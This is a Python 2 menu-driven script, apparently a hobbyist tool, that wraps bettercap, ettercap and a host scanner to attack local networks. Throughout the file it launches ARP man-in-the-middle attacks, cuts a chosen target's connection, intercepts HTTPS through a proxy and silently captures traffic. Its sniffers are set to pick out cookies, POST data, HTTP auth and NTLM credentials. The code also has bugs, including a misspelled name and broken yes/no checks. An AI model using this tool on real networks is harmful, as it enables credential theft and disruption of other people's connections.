import os, sys, socket, time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

Banner = bcolors.OKGREEN+"""
###############################################
#"""+bcolors.WARNING+""" |  /\ \   ___/   ____/   \ / _  \|  \__   \ """+bcolors.OKGREEN+"""#
#"""+bcolors.WARNING+""" | |  | | |__     __/  /|  | / \  \    \ | | """+bcolors.OKGREEN+"""#
#"""+bcolors.WARNING+""" | |  | |  __|   | |  |  \/ |   | |  \  \| | """+bcolors.OKGREEN+"""#
#"""+bcolors.WARNING+""" | |__| | |___   | |   \__\  \_/  /  |\    | """+bcolors.OKGREEN+"""#
#"""+bcolors.WARNING+""" |_____/\____/\__/  \____/ \_____/\__| |___/ """+bcolors.OKGREEN+"""#
###############################################
 CopyRight @ Jackel | @T0PK3K3L1TE/TopKekTools
   #Defcon Is A Basic Bettercap And Ship Tool
"""

Interface2Mscreen = bcolors.OKGREEN + """
##############################################
# """+bcolors.WARNING+"""1) Host Scanning With shIP     """+bcolors.OKGREEN+""" |Interface #
# """+bcolors.WARNING+"""2) Host Scanning With bettercap """+bcolors.OKGREEN+"""| Through  #
# """+bcolors.WARNING+"""3) Kill Target Connection       """+bcolors.OKGREEN+"""| default  #
# """+bcolors.WARNING+"""4) Full Scan shIP               """+bcolors.OKGREEN+"""|  wlan0   #
# """+bcolors.WARNING+"""5) Full Scan Bettercap          """+bcolors.OKGREEN+"""|   eth0   #
# """+bcolors.WARNING+"""6) Full Scan Bettercap/silent   """+bcolors.OKGREEN+"""|          #
# ------------------------------------------ #
# Extra    Commands |                        #
# ------------------                         #
# exit                       -Exits Script   #
# clear                      -Clears Screen  #
# menu                       -Brings Menu    #
##############################################
# """+bcolors.WARNING+"""Information: Why use shIP? Well bettercap  """+bcolors.OKGREEN+"""#
# """+bcolors.WARNING+"""can have several major effects on your     """+bcolors.OKGREEN+"""#
# """+bcolors.WARNING+"""Internet connection, in some cases basic   """+bcolors.OKGREEN+"""#
# """+bcolors.WARNING+"""Bettercap will stop all incoming and       """+bcolors.OKGREEN+"""#
# """+bcolors.WARNING+"""outgoing requests...                       """+bcolors.OKGREEN+"""#
##############################################

"""

Interface1Mscreen = bcolors.HEADER + """
##############################################
# """+bcolors.ENDC+"""1) Basic Bettercap Scan"""+bcolors.HEADER+"""                    #
# """+bcolors.ENDC+"""2) Full Bettercap Scan """+bcolors.HEADER+"""                    #
# """+bcolors.ENDC+"""3) Kill Connections    """+bcolors.HEADER+"""                    #
# ------------------------------------------ #
# Extra Commands |                           #
# ---------------                            #
# exit                         -Exits Script #
# clear                        -Clear Screen #
# menu                         -Brings Menu  #
##############################################
# Information: All Network Functions Will Be #
# Reset On Disconnection...                  #
#                                            #
##############################################

"""

Interface3Mscreen = bcolors.OKBLUE + """
##############################################
# """+bcolors.OKGREEN+"""1) Basic Ship Scan"""+bcolors.OKBLUE+"""                         #
# """+bcolors.OKGREEN+"""2) Basic Bettercap Scan"""+bcolors.OKBLUE+"""                    #
# """+bcolors.OKGREEN+"""3) Full Ship Scan"""+bcolors.OKBLUE+"""                          #
# """+bcolors.OKGREEN+"""4) Full Bettercap Scan"""+bcolors.OKBLUE+"""                     #
# """+bcolors.OKGREEN+"""5) Full Bettercap Scan With Proxy"""+bcolors.OKBLUE+"""          #
# """+bcolors.OKGREEN+"""6) Full Ettercap MITM"""+bcolors.OKBLUE+"""                      #
# ------------------------------------------ #
# Extra Commands |                           #
# ---------------                            #
# exit                        -Exits Screen  #
# menu                        -Pulls Menu    #
# clear                       -Clears Screen #
##############################################
# Information: With the use of ettercap you  #
# have full capability to a network.         #
##############################################

"""

Interface3EttercapMITMmscreen = bcolors.OKBLUE+"""
##############################################
# 1) Arp MITM
# 2) ICMP MITM
# 3) DHCP MITM
# 4) PORT MITM
#
#
#
#
#
#

"""

host = socket.gethostname()
home = os.getcwd()

def Interface3Run():
    main_selection = raw_input(bcolors.OKGREEN+"["+bcolors.FAIL+str(host)+bcolors.OKGREEN+"]?:>> ")
    if main_selection == str("1"):
        os.chdir("shIP")
        os.system("bash ship.sh -HM")
        os.chdir(str(home))
        Interface3Run()

    elif main_selection == str("2"):
        print bcolors.OKBLUE+"Begining Scan..."
        os.system("bettercap -X")
        print bcolors.OKBLUE + "Reseting Connections..."
        print "Restarting Needed Services"
        os.system("service networking restart")
        print bcolors.OKBLUE + "Networking Reset"
        os.system("service network-manager restart")
        print "Network Manager Reset"
        Interface3Run()

    elif main_selection == str("3"):
        os.chdir("shIP")
        print bcolors.OKBLUE+"Begining Scan..."
        os.system("bash ship.sh -HM -n")
        os.chdir(str(home))
        print bcolors.OKGREEN+"Scan Complete"
        Interface3Run()

    elif main_selection == str("4"):
        print bcolors.OKGREEN+"Begining Scan..."
        print bcolors.OKBLUE+"Use 'h' For Inline Help"
        os.system("ettercap -M arp -T")
        print bcolors.OKGREEN+"Scan Complete"
        Interface3Run()

    elif main_selection == str("5"):
        print bcolors.HEADER+"Begining Scan..."
        print bcolors.ENDC+"Use 'ctrl+c' To Stop"
        os.system("bettercap -X --proxy-https")
        print bcolors.OKBLUE + "Reseting Connections..."
        print "Restarting Needed Services"
        os.system("service networking restart")
        print bcolors.OKBLUE + "Networking Reset"
        os.system("service network-manager restart")
        print "Network Manager Reset"
        os.system("clear")
        Interface3Run()

    elif main_selection == str("6"):
        os.system("clear")
        print "Create Me"
        Interface3Run()

    elif main_selection == str("menu"):
        Interface3()

    elif main_selection == str("exit"):
        print bcolors.OKBLUE+"Would You Like To Reset All Network Services?[Y/n]"
        exiting = raw_input(bcolors.OKGREEN+"["+bcolors.FAIL+str(host)+bcolors.OKGREEN+"]?:>> ")
        if exiting == str("y" or "Y"):
            print bcolors.OKBLUE + "Reseting Connections..."
            print "Restarting Needed Services"
            os.system("service networking restart")
            print bcolors.OKBLUE + "Networking Reset"
            os.system("service network-manager restart")
            print "Network Manager Reset"
            sys.exit(1)

        elif exiting == str("n" or "N"):
            sys.exit(1)

        else:
            sys.exit(1)

    elif main_selection == str("clear"):
        os.system("clear")
        Interface3Run()

    else:
        print bcolors.FAIL+"Invalid Command"
        Interface3Run()

def Interface3():
    os.system("clear")
    print Interface3Mscreen
    Interface3Run()

def Interface1Run():
    main_selection = raw_input(bcolors.OKGREEN+"["+bcolors.WARNING+str(host)+bcolors.OKGREEN+"]?:>> ")
    if main_selection == str("1"):
        print bcolors.OKBLUE+"Begining Scan..."
        print bcolors.ENDC+"Use 'ctrl+c' To Stop"
        os.system("bettercap -X")
        print bcolors.OKBLUE + "Reseting Connections..."
        print "Restarting Needed Services"
        os.system("service networking restart")
        print bcolors.OKBLUE + "Networking Reset"
        os.system("service network-manager restart")
        print "Network Manager Reset"
        Interface1Run()

    elif main_selection == str("2"):
        print bcolors.OKBLUE+"Begining Scan..."
        print bcolors.ENDC+"Use 'alt+c' To Stop"
        os.system("bettercap -X --parsers SNMP, HTTPS, WHATSAPP, POST, NTLMSS, DICT, RLOGIN, MAIL, URL, PGSQL, SNPP, DHCP, MYSQLTEAMVIEWER, COOKIE, FTP, REDIS, NNTP, HTTPAUTH, IRC, MPD")
        print bcolors.OKBLUE + "Reseting Connections..."
        print "Restarting Needed Services"
        os.system("service networking restart")
        print bcolors.OKBLUE + "Networking Reset"
        os.system("service network-manager restart")
        print "Network Manager Reset"
        Interface1Run()

    elif main_selection == str("3"):
        print bcolors.OKBLUE+"Please Input A Target: "
        target = raw_input(bcolors.OKGREEN+"["+bcolors.FAIL+str(host)+bcolors.OKGREEN+"]?:>> ")
        print bcolors.ENDC  +"Use 'ctrl+c' To Stop"
        print bcolors.OKBLUE+"Begining Scan On: "+str(target)
        os.system("bettercap -T "+str(target)+" -X --kill")
        print bcolors.OKBLUE + "Reseting Connections..."
        print "Restarting Needed Services"
        os.system("service networking restart")
        print bcolors.OKBLUE + "Networking Reset"
        os.system("service network-manager restart")
        print "Network Manager Reset"

    elif main_selection == str("menu"):
        Interface1()

    elif main_selection == str("clear"):
        os.system("clear")
        Interface1Run()

    elif main_selection == str("exit"):
        print bcolors.OKBLUE+"Would You Like To Reset Networking Services Before Exiting?[Y/n]"
        exiting = raw_input(bcolors.OKGREEN+"["+bcolors.FAIL+str(host)+bcolors.OKGREEN+"]?:>> ")
        if exiting == str("y" or "Y"):
            print bcolors.OKBLUE + "Reseting Connections..."
            print "Restarting Needed Services"
            os.system("service networking restart")
            print bcolors.OKBLUE + "Networking Reset"
            os.system("service network-manager restart")
            print "Network Manager Reset"
            sys.exit(1)

        elif exiting == str("n" or "N"):
            sys.exit(1)

        else:
            print bcolors.FAIL+"Invalid Command"
            sys.exit(1)

def Interface1():
    os.system("clear")
    print Interface1Mscreen
    Interface1Run()

def Interface2RunStart():
    print Banner
    print Interface2Mscreen
    Interface2Run()

def Interface2Run():
    main_selection = raw_input(bcolors.OKGREEN+"["+bcolors.WARNING+str(host)+bcolors.OKGREEN+"]?:>> ")
    if main_selection == str("1"):
        print bcolors.WARNING + "Scanning..."
        os.system("bash ship.sh -H")
        print bcolors.HEADER + "Connected Hosts Listed..."
        Interface2Run()

    elif main_selection == str("2"):
        os.system("bettercap -X")
        Interface2Run()

    elif main_selection == str("3"):
        print bcolors.OKBLUE + "Finding Hosts For Targeting..."
        os.system("bash ship.sh -H")
        target_input = raw_input("["+bcolors.WARNING+str(host)+bcolors.OKBLUE+"]("+bcolors.WARNING+"Target"+bcolors.OKBLUE+")?:>> ")
        print bcolors.ENDC+"Starting Attack Use 'alt+c' To Stop..."
        print bcolors.HEADER+"[NOTE]:Internet Connection May Die During Attack..."
        os.system("bettercap -T "+str(target_input)+" -X --kill ")
        print bcolors.OKBLUE + "Reseting Connections..."
        print "Restarting Needed Services"
        os.system("service networking restart")
        print bcolors.OKBLUE + "Networking Reset"
        os.system("service network-manager restart")
        print "Network Manager Reset"
        Interface2Run()

    elif main_selection == str("4"):
        print bcolors.OKBLUE+"Running Full Network Scan..."
        print bcolors.HEADER+"Scanning For Hosts Along With Macs..."
        os.system("bash ship.sh -HM")
        print bcolors.ENDC+"Scan Complete"
        Interface2Run()

    elif main_selection == str("5"):
        print bcolors.ENDC+"Running Full Network Scan..."
        print bcolors.OKBLUE+"Scanning For All Traffic Use 'alt+c' To Stop..."
        os.system("bettercap -X")
        print "Restarting Needed Services"
        os.system("service networking restart")
        print bcolors.OKBLUE + "Networking Reset"
        os.system("service network-manager restart")
        print "Network Manager Reset"
        print bcolors.OKGREEN+"Returning..."
        Interface2Run()

    elif main_selection == str("6"):
        print bcolors.OKGREEN+"Begining Silent Scan..."
        print bcolors.WARNING+"Output File Set To: "+str(home)+"/Scan001.txt"
        print "Do You Wish To Keep This?[Y/n]..."+bcolors.OKGREEN
        outputfilecheck = raw_input("["+bcolors.WARNING+str(host)+bcolors.OKGREEN+"]?:>> ")
        if outputfilecheck == str("y" or "Y"):
            print bcolors.OKGREEN+"Output Directory: "+str(home)
            print bcolors.OKBLUE+"Output File Name : Scan001.txt"
            print bcolors.HEADER+"Use 'alt+c' To Stop The Attack"
            os.system("bettercap -X --proxy-https -o "+str(home)+"/Scan001.txt --silent")
            Interface2Run()

        elif outputfilecheck == str("n" or "N"):
            print "Please Input The Wanted File Directory.."
            print bcolors.ENDC+"IE:'/home/"+str(host)+"/Desktop'"+bcolors.OKGREEN
            outputfile = raw_input("["+bcolors.WARNING+str(host)+bcolors.OKGREEN+"]?:>> ")
            print "Checking File Location Entered..."
            outputfileexists = os.path.exists(str(outputfile))
            if outputfileexists == True:
                print bcolors.OKBLUE+"Path Found..."
                print "Please Enter The File Name Wanted..."
                print "IE:'file.txt'"
                outputfilename = raw_input("["+bcolors.WARNING+str(host)+bcolors.OKBLUE+"]?:>> ")
                print bcolors.OKGREEN+"Output Directory: "+str(outputfile)
                print bcolors.OKBLUE +"Output File Name: "+str(outputfilename)
                print bcolors.HEADER +"Use 'alt+c' To Stop The Attack"
                print bcolors.WARNING+"Starting Attack..."+bcolor.OKGREEN
                os.system("bettercap -X --proxy-https -O "+str(outputfile)+"/"+str(outputfilename)+" --silent")
                Interface2Run()

            elif outputfileexists == False:
                print bcolors.FAIL+"Could Not Source Output File"
                print "Returning..."
                Interface2Run()

            else:
                print bcolors.FAIL+"Operation Failed..."
                Interface2Run()

        else:
            print bcolors.FAIL+"Operation Failed Due To 'Invalid Entry'"
            Interface2Run()

    elif main_selection == str("menu"):
        Interface2RunStart()
        print "Restarting Needed Services"
        os.system("service networking restart")
        print bcolors.OKBLUE + "Networking Reset"
        os.system("service network-manager restart")
        print "Network Manager Reset"
        Interface2Run()

    elif main_selection == str("exit"):
        print bcolors.WARNING+"Do You Wish To Reset All Network Services?[Y/n]"
        reset_me = raw_input("["+bcolors.OKBLUE+str(host)+bcolors.WARNING+"]?:>> ")
        if reset_me == str("y" or "Y"):

            print "Restarting Needed Services"
            os.system("service networking restart")
            print bcolors.OKBLUE + "Networking Reset"
            os.system("service network-manager restart")
            print "Network Manager Reset"
            sys.exit(1)

        elif reset_me == str("n" or "N"):
            sys.exit(1)

        else:
            print bcolors.FAIL+"Operation Failed Due To 'Invalid Entry'"
            print "Note Reseting..."
            sys.exit(1)

    elif main_selection == str("clear"):
        os.system("clear")
        Interface2RunStart()

    else:
        print bcolors.FAIL + "Operation Failed..."
        Interface2Run()

def Interface2():
    print bcolors.OKGREEN + "Checking For shIP..."
    shIP = os.path.exists("shIP")
    print bcolors.HEADER + "shIP Status"+str(shIP)
    if shIP == True:
        os.chdir("shIP")
        os.system("clear")
        Interface2RunStart()

    elif shIP == False:
        print bcolors.FAIL + "Install shIP..."
        print "Attempting Install"
        os.system("git clone https://github.com/xtonousou/shIP.git")
        print "Shutting Down..."
        sys.exit(1)

    else:
        print bcolors.FAIL + "Operation Failed..."
        sys.exit(1)

def Running():
    print bcolors.OKBLUE  + "Please Setect A Wanted User Level For The Program..."
    print bcolors.OKGREEN + "[1]?:>> Basic Information Running With Bettercap"
    print bcolors.ENDC    + "[2]?:>> Run With Bettercap and shIP... (shIP Asset Needed)"
    print bcolors.HEADER  + "[3]?:>> Run With Ettercap, Bettercap, shIP... (shIP Asset Needed)"
    interface_input = raw_input(bcolors.OKGREEN+"["+bcolors.WARNING+str(host)+bcolors.OKGREEN+"]?:>> ")
    if interface_input == str("1"):
        Interface1()

    elif interface_input == str("2"):
        Interface2()

    elif interface_input == str("3"):
        Interface3()

    else:
        print bcolors.FAIL + "Invalid Entry..."
        time.sleep(3)
        Running()

def Main():
    print Banner
    Running()

Main()
